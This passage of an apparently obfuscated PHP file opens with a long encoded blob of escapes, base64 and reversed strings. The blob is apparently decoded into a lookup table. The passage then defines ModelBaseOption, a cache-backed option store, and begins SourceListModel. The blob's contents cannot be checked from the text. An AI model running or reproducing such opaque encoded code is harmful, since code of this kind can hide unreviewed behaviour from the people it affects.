o')."\247\254\243\274\56\210\311\61\177\105\74\170\323\150\100\21\316\222\231\200\323\353\5\231\255\5\342\102\107\60\320\131\331\257\2\43\251\245\21\241\261\121\32\341\372\23\131\17\113"."\201\167\157\21\263\45\256\1\236\55\100\171\355\23\114\373\12\214\116\333\47\122\322\253\53\36\237\26\362\103\17\132\271\34\55\340\61\170\26\250\47\51\53\107\30\201\314\143\355"."\x12\x59\x67\x5\x64\x78\x54\x7d\x35\x84\xb2\x3b\x28\xb\x97\xe3\xe5\x1d\x11\xe2\x13\x98\x97\xa6\xd6\xd3\x1c\x54\xb\xe3\x6b\x6b\x1a\x2c\x6a\x8e\xbb\xca\xe3\xfa\xe7\x13\xdd\x29\x63\xa7\x16\xdd\x9c"."\115\345\34\122\330\162\234\60\166\101\110\370\102\256\223\225\114\263\333\11\357\130\350\333\66\322\61\22\274\240\161\127\300\334\121\260\360\46\114\205\312\64\34\343\216\133\20\173\33".strrev('.ƒ™ì­›À ,ÄÃŸ>X¼q´—=<—[7&%ÄéÎ©û.[/Ş½“,:¾Â')."\x58\xf2\xb8\xf6\x1f\xf\x22\x20\xf8\x3c\x29\x3b\xba\x3e\xc2\xd4\xec\x24\xa6\x97\x1f\x6c\x7b\xb9\x87\x64\xff\xc0\x30\x12\x8b\x15\x6c\x73\xf7\xd8\xf4\x66\x32\x58\x33\x21\x28\xa9\xd9\x51\x3c\x96\x3c"."\314\343\316\301\221\267\100\140\3\143\316\322\237\123\152\215\65\150\13\107\325\150\56\351\203\21\53\364\11\346\4\332\107\126\174\176\243\373\227\367\167\367\147\144\340\270\266\226\317"."\xa3\xce\x4a\x1e\x4a\x3d\x7d\x11\x6e\xaa\x1\xfd\xc8\x1b\xf\xc\x4\xd3\x3b\xb9\x6\xb1\xfb\x89\x35\x7d\x64\x43\x26\xe1\x6d\xc3\xa8\x4\x36\xfb\x1f\xe3\xdc\x42\x98\x3c\x16\x53\x3\x77\x57\xe2\x74".base64_decode('wN680PcsV6T3imR8wTsCAyk5E1OH4ozQE5ff8OpCGxsRAp3ZbuVg89xUhzCxrrVuRg==')."\3\372\155\254\13\324\141\266\207\304\61\56\342\4\322\217\272\326\31\15\44\320\10\136\127\46\301\142\104\162\306\52\356\172\101\214\263\14\201\126\272\240\130\106\240\201\327\176\163".base64_decode('uDk8BvRg2Ub8RfF0it8t9riqlSaZ4F2VXT+DU2mAupzTxXvCnEJ3d0Dza4KR7lOCwg==')."\x3d\xf2\x92\x65\xe3\xa5\xa2\x2\xe7\x99\xb6\xfa\x39\xa1\xa6\x7a\x85\x3d\xad\xd3\x56\xdf\x97\xe9\xc\x2e\xac\x5f\xb6\xf4\xe0\x25\x51\x72\x5d\xe9\xea\xdd\xf8\xbe\x11\x9f\xb6\xe9\x31\x73\x29\x5c\x27"."\54\301\213\212\107\302\336\330\164\165\1\377\112\332\244\145\152\143\16\242\120\245\120\126\172\171\107\40\100\305\24\273\172\37\247\157\302\151\271\251\273\143\226\15\267\264\300\270\65".strrev('‚$¤ä™¢eå½d[É¢&{ç±vZ`àÇÄŠ‰å}0seŠÑèDê[J•D‚•ó3')."\xf4\x55\x90\x56\x45\x7e\x2a\x46\xf2\x14\x4c\x84\x24\x74\xbd\x32\x85\x3\x48\xc3\xf4\x94\x25\x9\xda\x9a\x17\xfa\xe8\x98\x44\xaa\x5e\x12\x79\x92\xaf\xbf\x78\x12\x82\x88\x63\xc0\x2b\x3\x2d\x37\xd7".strrev('b¯¤Uª$š»5Û1ºnFƒæxƒı¾ÆÎlG?Ÿ”ÓÁTCñ Ÿø¼EË|Ü')."\xe4\xfc\x9f\x24\x17\xe3\xc1\x4a\x85\x7d\xb0\x66\xa3\x32\xd3\xc9\xa\x90\x41\xc4\x79\x7b\xb2\xb7\x78\x7c\x28\xf\xf2\x7b\x0\xbf\x33\x7a\xc1\xa8\x6b\xd5\x9e\xf3\xd1\xb2\x56\x9a\xe7\xb6\xb6\x2c\x42"."\377\323\224\23\331\275\176\245\314\324\200\121\220\171\326\77\76\234\147\24\102\274\76\302\306\206\47\134\172\212\300\223\54\300\310\327\76\43\55\236\162\242\267\236\247\157\140\240\364"."\234\50\75\231\100\244\267\164\45\141\155\27\225\277\61\121\203\306\346\230\365\247\301\236\372\220\226\57\237\220\41\26\260\171\171\115\54\221\301\342\210\30\311\40\326\170\6\14\37"."\101\35\265\4\343\105\266\140\131\64\132\250\230\43\155\122\246\342\132\226\122\322\314\11\340\153\147\72\255\63\235\305\370\103\155\130\327\333\231\311\336\2\21\176\146\361\16\43\74"."\10\122\137\70\220\103\145\325\41\374\36\116\10\157\137\251\212\104\257\124\264\117\371\256\110\345\7\5\173\311\103\53\64\14\217\256\100\106\242\157\171\274\107\322\333\221\22\324\150".base64_decode('R48a6e2tmQGTReVY+NI7NAzfxU+o0dASozSkZLF9QVsdTq1THDvLHPLWhYEIkwJCsA==')."\272\304\200\52\365\270\212\222\107\143\12\222\20\315\256\137\272\44\154\54\345\363\41\234\23\331\226\60\237\10\205\117\300\107\207\60\326\214\61\117\304\10\40\137\324\223\324\116\341".base64_decode('ikhRlmgKBXVbPRHX1isFtJlztcCl/so97LZkSViTM/HiS1mMd+YnhlHubK+mxD0iuQ==')."\xef\x26\xcf\x75\x44\x35\x73\x55\x75\x15\xdc\x78\x28\x2b\x67\xad\xa3\x26\x23\x3\xf2\xbc\x12\x73\x8f\xea\xda\x61\x72\x3e\xd\x8b\xa3\x92\x4a\xdf\x8c\xab\x7d\x5f\xc1\xc5\xfb\x35\x30\x6\x5f\x94\xa3".base64_decode('NcFuKLXsCMZKsYVANyCjFx98aIbn3QJXUl2oYGsoIiy2xSNCmzbRhjA/sXlzdRpoPw==')."\372\263\42\145\303\237\204\121\313\237\206\17\240\42\15\355\205\336\317\120\264\226\13\211\24\126\206\376\212\72\211\236\345\42\102\327\236\47\163\35\123\64\46\261\376\165\365\241\131".base64_decode('mzeHDaYjxPQZWN0QL03j/SFveTQSAD0vCAn+kpQ7PRlW58HhWcKCi+sCKVhBqK1t6Q==').base64_decode('On4VMsDyGItpzFnIUGCyEMys5sFoj2Ci+SqgBCdE5AURr+ffZeIxJQpVORwpl+VomA==')."\x45\xb0\x9c\xbc\x68\xc\x86\x39\x39\xa0\xb2\xf3\x50\x56\x18\x3e\xb1\x22\x84\x18\xf9\xd2\xb1\x22\x8f\x2f\x3\x9b\x69\x90\xe4\x51\x44\x50\x11\xe7\x36\xec\x4f\x47\x6d\xf1\x44\x1e\x58\xe2\x64\x6d\xa3"."\xec\x7a\x8\x19\x7d\x35\xb3\x8e\xbc\xdf\x33\xac\x8d\x6a\xb4\x48\x9d\x2\xa7\xfe\xb6\x3a\xe2\xd6\xbe\xe\x11\x2e\x9a\x3\x14\x43\x74\x65\x9\xa6\x50\x8a\xad\x17\xdb\xea\x48\x77\x9d\x82\xae\xa3\xfa"."\x84\x6\xd5\xfa\x8\xaa\x58\xa7\x30\xf2\x59\xd2\x38\xc4\x6c\xd7\x42\x9b\x27\x37\xa6\x81\xd7\xc4\xfa\x52\x60\x22\x10\xe9\x81\xbb\x89\x13\xd6\xd3\xdf\x19\x27\x30\xc\x21\xcf\xde\x15\x75\x9b\x2a\x40"."\23\172\104\156\305\362\130\232\103\13\301\253\146\275\251\144\46\31\145\117\37\171\305\76\64\155\36\143\176\35\152\54\46\216\117\314\214\205\353\11\260\22\234\235\10\103\12\314\273"."\135\61\115\256\162\205\371\113\276\347\221\303\265\236\13\51\353\64\166\133\2\144\220\136\377\244\13\25\127\354\243\330\21\176\6\133\304\72\220\54\271\24\304\16\15\121\103\353\250".base64_decode('XW5bE7NKYBpbwiIKq42oJ6eTPez9EtgyiS1ONBGP9WTUOOyWc5oXhJqEgQx1jhrldw==')."\364\360\321\32\335\241\302\315\14\127\256\322\115\217\60\206\16\243\150\61\207\215\315\115\115\115\301\246\71\350\177\246\36\314\334\304\265\62\357\10\122\221\246\246\126\362\77\315\40"."\262\107\230\107\157\16\242\27\214\320\101\201\61\135\207\16\301\306\122\62\314\12\343\342\326\105\261\221\224\202\273\6\320\23\312\141\150\12\211\37\105\106\163\74\357\247\51\344\206"."\15\142\272\37\10\374\352\22\220\202\355\356\324\37\56\174\10\235\124\314\41\2\24\350\57\267\310\103\305\4\352\55\246\306\220\155\274\123\61\63\267\116\376\130\210\1\227\46\12"."\x67\xd0\x41\x96\x11\x94\x1f\x64\x80\x4a\x74\x37\x11\xc2\x79\x4f\xd7\x50\x1d\xaf\x83\x46\x9c\x82\xb6\xfd\x2c\x1f\x27\x4e\x90\x44\x36\x98\x33\x94\x9c\x4e\xe2\xa8\x2c\x83\x27\xd9\xdc\xac\x8d\xc4\x8a"."\xdc\xf2\x1e\x47\x7b\x78\x4b\xf4\xdd\xf\x6a\x5e\x6\x30\xac\x81\xf9\x5\x6b\x4c\x15\x1b\x37\x8e\x9e\xcc\x63\x4\xa4\xf8\x8c\xc6\xd0\x30\x27\x99\x1e\x62\xb8\x32\x12\x2e\x15\xe7\x62\x2e\x71\xbf\xe"."\352\2\304\34\175\304\50\172\214\160\125\251\252\14\333\305\270\40\33\111\306\133\23\67\204\210\100\204\277\176\102\325\367\130\337\24\130\305\64\112\134\103\223\27\32\251\306\145\353"."\xc1\x55\x93\xeb\xfa\x27\x96\xcc\x91\x6d\x9\x8b\xda\x2a\xa5\x19\x16\x93\x66\x8a\x9\x9b\xd3\x9f\xa0\xd7\xc2\x52\x62\x2c\x81\x8a\xc9\xa3\xdc\x3b\xa3\xd4\x80\x3f\xcb\x57\x27\x42\x65\xd4\x55\x15\x20"."\xbd\xba\x34\x11\xe5\xd7\x28\x8d\xd3\x7d\xa5\x89\xeb\xc5\x28\x77\x37\x2b\xfb\x63\xa4\xd7\xe5\x92\x8a\x86\x3\x4e\xf1\xc5\xfd\x38\x6b\x63\x54\x3a\xbe\x85\xca\xb6\x35\x84\x66\xdd\x91\x81\x86\xd2\x7b".strrev('e9"‘ü¢2–jïDŠîÜ-4T³’ñ5y,,è'."\n".'¥=€Òø‰ÉË—½âk%Õâó\'k')."\10\302\162\173\333\300\347\114\157\12\357\331\307\40\35\223\17\270\360\354\256\254\305\107\213\11\212\204\145\67\262\304\131\365\240\11\303\125\246\200\201\41\44\156\74\275\351\64\215"."\236\340\75\67\61\31\102\350\212\72\173\5\230\246\322\105\205\33\110\260\327\54\323\36\137\306\200\246\260\164\333\332\344\152\336\274\327\317\274\200\5\56\142\245\60\130\271\150\122"."\x96\xd4\x63\x90\xaa\xb2\x70\x5\xaf\xe8\x2e\xfe\xb2\x6c\xd\x44\xf4\x22\x5b\x15\x56\x11\x56\x3\x37\x0\xbd\x41\xab\x59\x8a\xe1\xd6\x81\x90\x5\xd0\x11\xd2\xa1\x72\xc0\x0\x4e\x56\xe8\x73\xab\x8a"."\251\163\373\151\357\244\312\25\340\251\40\13\261\140\330\325\253\134\11\267\325\347\43\121\53\74\24\221\367\165\35\351\54\123\2\123\146\206\232\101\101\155\46\173\47\200\322\143\161".strrev('ÄÅÍÒEËLİv„7"…{J»»Å›¡»‰µ˜Ô£¬„À›¾)€ç@ÃC¯a†')."\xc9\x7c\x8d\x5c\x6c\xab\xce\xbe\xc6\xdd\xde\x2\xe5\x47\x65\x2c\x97\x9f\x1d\x71\xf3\x8\x95\x45\x24\x21\x33\x89\x19\x5a\x25\xb8\x54\x74\xd5\x73\x8b\x27\xb9\xdc\xe6\x45\x51\x37\x58\xe7\x35\xd6\x37"."\242\214\105\34\223\113\307\131\137\324\257\272\206\153\110\34\15\212\112\73\57\331\367\135\266\165\63\277\345\102\345\213\4\5\1\176\375\322\63\131\140\213\300\243\264\244\51\124\243"."\x7f\xd0\x2a\x6f\x13\xf7\xc0\x14\x1a\x67\xc0\xc0\xd8\x7a\xd6\xb2\x89\x14\x45\x72\x1\x61\xba\x29\x7d\x48\x8e\x26\x2c\x2e\x3d\xc2\x57\x7a\xb5\x9a\xc0\x5e\x77\x24\xb2\x83\x57\x61\x24\xeb\x56\x64\x1f".base64_decode('PpLfdBST3OBLjGhwjsI5WJW2TCOzpQxSvhYz6xNzSmYZRGyTrgzyeygfi8ksPRSZgw==')."\x63\xa6\x1b\xb8\x1\xe2\x4e\x5\x8f\xc0\x91\xf3\x50\xb3\xd8\x45\xb1\x18\x99\x5c\x85\x7c\xb3\xaa\xa\xcd\xc3\x4c\x94\x70\x4a\x22\xe7\x38\xd8\xbf\x7d\x1f\x9b\xc5\x5a\x39\x35\x3e\x45\xb2\x24\x88\x66"."\xb9\x9b\x26\x80\x8e\x0\x12\x64\x4c\xe8\x4c\x57\x32\x38\xa7\x39\xc8\x1c\xf6\xc9\x66\x20\xec\x40\x44\x63\xf8\xf4\x25\xa1\x1\x3e\x23\x32\x32\x6\x9a\x86\x50\x4e\x94\xb1\xa4\xdb\x3c\xe2\xa8\x44\xb8"."\144\40\76\131\370\174\22\347\55\74\146\113\274\204\316\265\20\211\27\23\231\254\13\45\1\252\234\210\13\364\325\312\247\20\302\331\35\36\165\122\137\1\264\76\274\371\340\2\137"."\164\206\72\122\261\74\132\76\276\106\340\71\5\331\311\77\251\45\306\41\164\152\121\222\105\35\355\113\200\21\312\16\324\277\13\123\16\346\104\116\44\147\54\236\130\255\60\201\261"."\22\232\244\6\262\360\206\150\103\43\66\220\365\210\342\272\47\270\31\43\326\64\302\233\64\127\42\165\344\10\313\345\310\351\170\42\124\263\312\123\233\47\361\122\143\72\263\165\145"."\42\243\336\256\336\60\117\152\347\313\223\112\33\204\133\251\50\123\137\322\307\365\54\264\125\62\262\112\42\271\74\36\215\44\72\342\351\25\312\220\356\52\102\263\203\74\207\341\135"."\xca\x44\x84\x4a\x1\xcf\xb0\x7a\x90\xbf\xd9\x80\x83\xc1\x41\x74\x62\x8\xe6\xf8\xa9\xca\x11\xe7\x27\xe9\xd\x72\xe9\x51\x2b\x6f\xb3\x14\xff\x74\xbb\xaa\x45\x13\x9b\xb0\x14\xab\xea\x60\xc1\x70\x8d"."\xd2\x45\x21\x6\x95\xa\x97\x6d\xbd\xba\xfc\x84\x8e\x15\x8a\xa4\x1e\x4b\x15\x2a\x35\x7a\x3\xe5\x6b\x7f\x81\xbc\xa7\x21\x97\x46\x8c\x90\x6e\x4e\xd7\x79\xc3\x1c\x35\x1c\x43\x2c\x7c\x56\x63\x42\x6e"."\75\322\321\35\357\121\43\211\104\162\265\107\17\117\210\304\155\376\130\111\116\176\333\104\232\31\61\11\364\353\325\336\316\300\127\224\354\103\336\47\106\241\323\47\73\276\343\116\107"."\341\1\106\376\10\2\215\112\17\21\225\155\315\160\164\51\201\76\231\63\13\54\106\264\142\321\363\254\140\61\57\105\53\336\235\265\346\247\124\372\1\226\46\71\331\253\125\40\25"."\x5f\xde\x95\xf9\x1f\x77\xd5\xc8\x9\x7\x57\x46\x8e\xa9\xa6\x70\x3\x3f\xfa\x3e\x42\x54\x7e\x82\x92\x7d\xb3\xea\xb1\xa5\x4f\x7c\xb6\x29\x20\x6e\xcd\x54\xe2\xf6\x87\xbd\xf\x67\x91\xe3\x10\xf0\xea"."\64\55\236\124\251\7\34\361\11\304\235\330\23\145\371\332\62\234\143\157\325\60\146\27\373\361\213\261\273\62\34\21\7\23\134\34\132\303\237\243\307\125\164\12\307\362\73\166\204".base64_decode('YXqViE4AnD3X9r4HqD72rYOqb5DHDmgeuZdBJQfE4FCMv3QiqvpzanQAZStCpsULKA==')."\155\112\23\175\13\215\277\142\241\54\141\346\312\342\3\304\333\126\254\124\166\75\107\371\56\131\25\135\232\33\232\100\70\35\161\124\303\252\126\126\151\242\52\301\43\310\112\260\176".base64_decode('cfVB/IaHmbdk+BGCjO0K6JuFVGYQQEcH3a1+8IhW/z+pSDPTkntFbyPVHXL8W51guw==')."\xf0\x5b\x4e\x5\x6b\xcc\xfb\x90\x21\x4e\xf1\xbf\xde\xe4\x79\xb7\x49\x5a\x34\xc4\xaa\x56\x7e\x69\xca\x5b\x29\x50\xf5\x96\x8a\x42\xde\xa0\x55\x10\xaa\xc3\x2c\x62\x57\x4c\x8e\xbc\x4c\xa5\x4f\xcf\xa4"."\x3f\xfd\xf0\xcb\xb6\x33\x7f\x27\x28\xa1\x82\x4f\x36\x72\xa4\x8a\x16\x8c\x62\xce\xe6\xba\x43\x22\xa1\x5b\x17\x82\x2\x52\xb\xab\xcf\x68\xec\xad\x5d\xf2\xc8\x1b\xc\x97\x3f\xdf\x52\xeb\x49\x2f\xec"."\x45\xcf\xfb\xa\x8d\x78\xdc\x47\xec\x9d\xde\xc7\x4e\xf8\x3d\xb7\x23\x16\x83\xe3\x7a\x9e\xd7\xc9\x58\x19\x6d\x28\x40\x39\x32\x4c\xd5\x44\xac\x7d\x42\xe\xcb\x2a\xad\x64\x14\x28\x13\x0\x69\xe4\xf8"."\174\57\225\12\260\127\362\162\1\362\202\33\45\165\376\367\141\244\225\306\351\247\134\173\250\150\15\152\305\24\125\271\363\130\241\330\350\64\245\263\75\300\123\214\46\205\265\162\131"."\xdc\xa1\xc9\x5b\x26\xfa\xd7\x63\xfd\x7\x79\x7d\x99\x2e\x95\xd8\xb0\xab\xf4\x56\x3e\x2d\x70\x4e\xba\x7d\xa3\x89\x70\x13\x57\x31\xe3\xf4\x42\xc3\x93\x6a\x4b\xe7\x3c\xd9\x31\x29\xbd\x73\x14\xf6\x66".strrev('Œ…K('."\n".'AòCõ.|3ÖòP!2±Š/«‡²oJw‰/ÅÙ&äÀ2^—³õP')."\121\11\161\303\364\215\74\102\51\144\306\375\143\122\245\267\213\340\55\276\132\117\21\121\314\47\77\35\172\236\37\152\160\134\154\356\262\37\16\241\163\342\177\46\257\372\311\77\366".strrev('j¬g ~R}X8:ŸğôuPÜü³ƒÂ}ç'."\0".'a#…î?L /ï}¦û_¶ğ:[¼')."\xf9\xb0\xb8\x4a\xf7\xbc\x46\x28\x8d\x1a\x48\x5b\xf5\x8b\x86\x12\x18\xa4\x71\x57\xec\x62\x80\x68\x15\x4\x98\x1f\xbb\x9a\x8f\x22\x7a\xde\x5b\xf2\x4f\x68\x8d\x67\x15\x3f\xb1\x41\xd0\x74\x26\x87\xae"."\x9c\x97\xea\xb5\x2e\x19\xb4\xd9\x35\xad\xbf\x98\xe1\xc1\x5d\xd5\xd6\x85\x71\xc\x75\x40\x5a\xb5\x41\xac\x2d\xe5\x9a\xe7\xb6\x2c\x92\x85\x1b\x62\xa\xc5\x5d\xe7\x5c\xfa\x3\x77\xb0\xc0\xad\x8\xa4".strrev('«ı>ˆm%¤©à€AWÕá*J‹@ôâ0[?ğßN	ú¼ùW¦Iú¼©ëÌ(`<P').strrev('û®9<ƒ4‡`"nu¬ {Ímw»,%ØÏˆ«Dİô,ZV|CŒjeıé»¼P-ÑÕb8”')."\373\116\0\3\322\24\221\55\35\254\344\26\135\313\57\12\302\325\361\276\110\304\232\111\223\75\240\200\215\251\305\152\223\50\321\377\140\2\331\31\211\36\247\204\152\123\215\221\207"."\117\142\244\245\306\273\230\222\372\307\307\364\233\162\167\374\74\30\324\334\240\204\220\222\370\120\167\223\144\202\201\104\210\143\253\167\254\276\346\121\65\321\306\100\100\231\256\120\65".base64_decode('iyc9nyncbUnMHa7NLCynOfUTAz8vmyQ/+0eM5IR3CbJcPUtXciwsG5mRhuQ1Ud209A==')."\210\242\220\12\21\61\22\214\10\26\64\121\143\40\335\214\54\347\266\211\232\244\233\346\25\125\141\120\113\317\340\132\162\130\114\1\46\373\111\346\242\25\175\335\163\324\104\361\16"."\xdf\x1b\xc9\x84\x44\xf9\x1f\x4e\x66\x20\x22\x74\x41\x90\x3c\xc9\xc4\xd5\x73\xae\xe1\x2f\xc7\x79\xce\x39\x8e\xff\x2d\x49\xc4\xed\xc9\x2e\x97\x51\xd4\xff\xe2\x2e\xd0\x46\x62\x41\x40\xbf\x26\xed\xae".base64_decode('rFNDUqinUhIRSb5LjlQ802MJjH1I+cgAsy92fC/JUge4NMw4///rZxT/X72e2NLEJA==').base64_decode('8Z6HlpcD/w29xdedXB5BpcC+cXh30IMAi/ij4lKcK0MzP2LMvZjGbsO0YlHaZ2ufWA==').base64_decode('qp6wRcg3wt9DrRXxW8z5n7Ndxx5+Jy/VDtQqKMgQPxjVwGOaxPhh6UlzIztS4yqbKA==').base64_decode('dHodVkv8R1Ux0QfEpjAHbWEWyuITIfGaANCTDVyTZXZ2bASiPwC/YE0PNEqmS56kKg==').base64_decode('apbxzIknUQY3zCE2EWbT6anR7Xu2kxZyZNh6pPfVmg3VtTkdkKtgHXSvQIs/uN7kfw==')."\x81\x7d\x4e\xd0\xd7\x1c\x7f\xb9\xd4\x8b\xeb\x9e\xd7\x33\xa9\x36\x8\x5a\x20\x29\x2c\xe5\x60\x72\x2b\x72\x1\x44\x6e\x82\x83\xd5\x75\x28\x5e\xa7\x45\x99\x69\x56\x56\xed\xf5\xcd\x3b\x25\x84\x78\x38"."\x24\xc3\x83\xd1\x89\x5e\xdb\x22\xbc\xa0\x37\x95\x4b\x7e\x24\xd5\x5e\xe9\x15\xf1\x2a\xf6\x8e\x26\xcf\xc\xc9\x3\x91\xaf\x48\xbd\xf7\x2c\xe8\xf4\x27\x2e\x1e\xd\x8b\x38\xbe\x67\x55\xfb\xba\x1b\x88"."\171\24\40\72\72\220\164\132\2\145\244\147\274\361\302\24\76\44\261\42\63\221\101\116\111\174\0\263\130\224\324\372\41\311\43\51\164\344\67\106\274\65\261\241\206\167\11\56\255"."\x55\x2c\x6b\xd9\x8e\x54\x8c\xa7\xd7\x2a\x8b\x11\x53\x96\x84\xc8\x79\xf8\x9\x66\xd7\x33\x45\xe2\xd\x3\xff\xdb\x5\x44\x3e\x40\x8f\xfc\x9e\x93\x3f\x5c\x15\xcb\x49\xd2\xd5\x29\x62\xdf\x73\xde\xc7"."\120\110\46\111\146\356\106\241\5\351\362\317\173\367\312\275\264\127\221\333\212\221\220\262\111\55\346\305\16\375\142\253\316\270\160\122\101\262\351\265\106\144\124\343\176\140\374\265\274".base64_decode('D79LN7VZgpCx6ss4cUcoMSusGj5biX3El17rHfO8Nio4LcHd53Kd2miNojl2vuGpKA==')."\205\27\45\234\232\144\330\54\114\10\364\61\377\103\317\41\331\30\332\123\260\72\125\30\76\113\365\305\265\214\30\46\116\253\65\174\262\320\274\325\145\303\152\216\124\42\211\76\147".base64_decode('wdUapJMU1vsQ+g50KFxgID7pNePmxficoTLENinoSfWdDbFshrEdvixHfqTZewErSw==')."\60\44\24\320\213\11\251\71\371\162\166\332\12\351\332\37\21\130\351\5\261\144\377\56\62\330\16\51\267\342\41\221\174\140\120\62\45\147\172\272\343\237\132\162\254\21\350\113\23"."\x4b\x44\x30\x4c\xf3\x22\xde\x2c\x5a\x5e\xf7\xf5\x5e\xae\xe0\x1f\x19\xad\xe1\x8c\x19\x6e\xb6\x20\x9d\xb5\xaa\x33\xab\xd3\xed\x2a\xa0\xc2\x87\x6a\xf7\xd7\xdf\x2b\x6\x53\xff\x9\x54\x34\x52\xd5\x1f".base64_decode('ScMjY9WoQ3tUsxrNwjUFz+upOw0IcF2ahetWZbPKksBGqudqFWea4VUDD6QYuRoD9g==')."\235\365\151\321\351\340\131\263\160\365\347\0\343\374\245\211\330\243\166\57\204\264\302\167\323\136\253\27\65\13\117\333\13\121\332\267\13\324\242\265\54\247\6\165\245\224\143\132\355".strrev('Œh´iĞÉôÂ4©pË¥ñÕãƒ)5RQÕµ&ÊËdj®NË…¼Iúı'."\r".'^EæMQ‘¡').strrev('j»‹ÒŸT–'."\0".'€«MlíÉ›/5ª¹ÃöÄxŠ±,Ô\'%-ñiˆæ+şCÓ?†¦<=')."\xcc\x29\xe8\xb1\xca\x72\x8d\xac\xee\xf5\x6d\x2b\xfb\xba\xa2\xf9\xec\x23\x45\x21\x8c\x14\x6f\xc7\xd4\x58\x51\x28\x28\x24\x1b\x1e\xbd\x86\x1a\x92\x33\x92\x44\x83\x21\x21\xa2\xa7\xed\x89\xb1\x49\x38"."\342\261\204\241\154\5\334\154\320\113\321\50\276\174\347\327\141\304\117\53\335\206\151\166\332\262\335\0\316\313\130\145\362\333\156\271\256\120\22\240\242\4\302\73\342\275\64\40\351"."\300\240\220\270\373\302\235\42\227\52\4\215\11\65\42\101\270\236\305\147\364\264\116\163\11\15\363\104\360\145\15\217\310\133\45\134\323\166\126\174\27\311\42\1\35\210\7\255\161"."\346\160\12\33\356\213\376\210\353\34\315\317\37\12\326\6\120\123\326\350\41\356\21\234\60\315\11\303\113\12\101\322\6\274\316\26\32\56\17\171\252\323\167\255\270\346\355\307\265".base64_decode('ACJd0QR1o05kbWBKlM6kq7J6I+n06mSqg3pdr8omtSQNqaqs3q5kz3R5se5IPFGVhw==').base64_decode('lal6VOG6jGbFe0kvyY3kdL2IR1eInpC7b3FTUC5Y7AKA3aSktSKTC0hmu3pJ+KwTdQ==').base64_decode('vOIOeV4d5lySB7xPGPl0FhnCQkNYEaoH2k6VIRV7oed0gPPgsp2iuNgPeRQApHSyTg==').strrev('†ÕÛ\'°Ñ¾)+ÀJÀ†ƒ†éA­†ê4dòw'."\0".'W$ 7ÕÎ%’Àš¬ÂI¯ŞOğ’!')."\152\336\203\123\311\42\246\4\102\346\367\277\1\334\3\41\23\45\257\0\0"."", 10, -8))); goto cª‰‚‹çÂÅ; Fóç¬¾±«: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ù»¡Àâä = false, $”İ’˜ƒ¾ = '', $âñçı÷É = false) { $–ò”£ş½ =& $_SERVER[çâ¥×ø³]; $ª×ßØÜõ = $this->cacheGet($”İ’˜ƒ¾); $Ìàï‹¬‰ = $this->optionDefault($”İ’˜ƒ¾); $Ìàï‹¬‰ = is_array($Ìàï‹¬‰) ? $Ìàï‹¬‰ : array(); if (is_array($ª×ßØÜõ)) { $ª×ßØÜõ = array_merge($Ìàï‹¬‰, $ª×ßØÜõ); return $ù»¡Àâä ? isset($ª×ßØÜõ[$ù»¡Àâä]) ? $ª×ßØÜõ[$ù»¡Àâä] : null : $ª×ßØÜõ; } $ıÉØú‡ = $this->filterWhere(array($–ò”£ş½[33] => $”İ’˜ƒ¾)); $ª×ßØÜõ = $this->where($ıÉØú‡)->select(); $ª×ßØÜõ = array_to_keyvalue($ª×ßØÜõ, $–ò”£ş½[94], $–ò”£ş½[418]); foreach ($ª×ßØÜõ as $óà¾Á÷Å => $ŒìÔî­®) { if ($âñçı÷É || in_array($óà¾Á÷Å, $this->jsonField)) { $ª×ßØÜõ[$óà¾Á÷Å] = json_decode($ŒìÔî­®, !0); } } $this->cacheSet($”İ’˜ƒ¾, $ª×ßØÜõ); $ª×ßØÜõ = array_merge($Ìàï‹¬‰, $ª×ßØÜõ); return $ù»¡Àâä ? $ª×ßØÜõ[$ù»¡Àâä] : $ª×ßØÜõ; } public function set($¾Ö¹ğ¤ì, $¸¨İ‹Ü = false, $¬İæ­« = '') { $¥£¡Éã =& $_SERVER[çâ¥×ø³]; $this->cacheRemove($¬İæ­«); $Š„òÌŸù = array(); $ÙÊ­–ôŠ = is_array($¾Ö¹ğ¤ì) ? $¾Ö¹ğ¤ì : array($¾Ö¹ğ¤ì => $¸¨İ‹Ü); foreach ($ÙÊ­–ôŠ as $Ï–äÀò¸ => $¦¯òÑÕ³) { if (is_array($¦¯òÑÕ³)) { $¦¯òÑÕ³ = json_encode_force($¦¯òÑÕ³); } $this->checkLength($¦¯òÑÕ³, !1, $this->tableName . $¥£¡Éã[4] . $¾Ö¹ğ¤ì); $¦¯òÑÕ³ = self::textEncode($¦¯òÑÕ³); $ÙÊ­–ôŠ = array($¥£¡Éã[33] => $¬İæ­«, $¥£¡Éã[94] => $Ï–äÀò¸, $¥£¡Éã[418] => $¦¯òÑÕ³); $Š„òÌŸù[] = $this->filterWhere($ÙÊ­–ôŠ); } if (!$Š„òÌŸù) { return !0; } $¹Ş¬—²» = $this->cacheKey($¥£¡Éã[444]); CacheLock::lock($¹Ş¬—²»); $è’¯¿­ = $this->addAll($Š„òÌŸù, array(), !0); CacheLock::unlock($¹Ş¬—²»); return $è’¯¿­; } protected function optionDefault($¥‰Óé­É = '') { return !1; } public function setDeep($¿ıÂéº®, $Ê“ŠĞ = false, $èµºÓÌ† = '') { $¨ñ¤½¡´ = explode($_SERVER[çâ¥×ø³][10], $¿ıÂéº®); $ìşŒ…•È = $this->get(); array_set_value($ìşŒ…•È, $¿ıÂéº®, $Ê“ŠĞ); $this->set($¨ñ¤½¡´[0], $ìşŒ…•È[$¨ñ¤½¡´[0]], $èµºÓÌ†); } public function remove($£§­‡Õ, $Ù†§îÂÈ = '') { $¬Ø±şŸå =& $_SERVER[çâ¥×ø³]; $this->cacheRemove($Ù†§îÂÈ); $÷‰èúÃ = $this->filterWhere(array($¬Ø±şŸå[94] => $£§­‡Õ, $¬Ø±şŸå[33] => $Ù†§îÂÈ)); if (is_null($£§­‡Õ)) { unset($÷‰èúÃ[$¬Ø±şŸå[94]]); } return $this->where($÷‰èúÃ)->delete(); } public function cacheSet($Å·è€½İ, $øôçÓ²¦ = false) { return Cache::set($this->cacheKey($Å·è€½İ), $øôçÓ²¦); } public function cacheGet($½ûÉ±ÂÇ) { return Cache::get($this->cacheKey($½ûÉ±ÂÇ)); } public function cacheRemove($û²İ¯É) { return Cache::remove($this->cacheKey($û²İ¯É)); } protected function filterWhere($êœ¿Ş ù) { return $êœ¿Ş ù; } protected function cacheKey($¡ˆñ×ŞŠ) { return $¡ˆñ×ŞŠ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\143\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\145" => "\151\x6f\x5f\163\x6f\165\x72\x63\x65\137\x6d\145\164\x61", 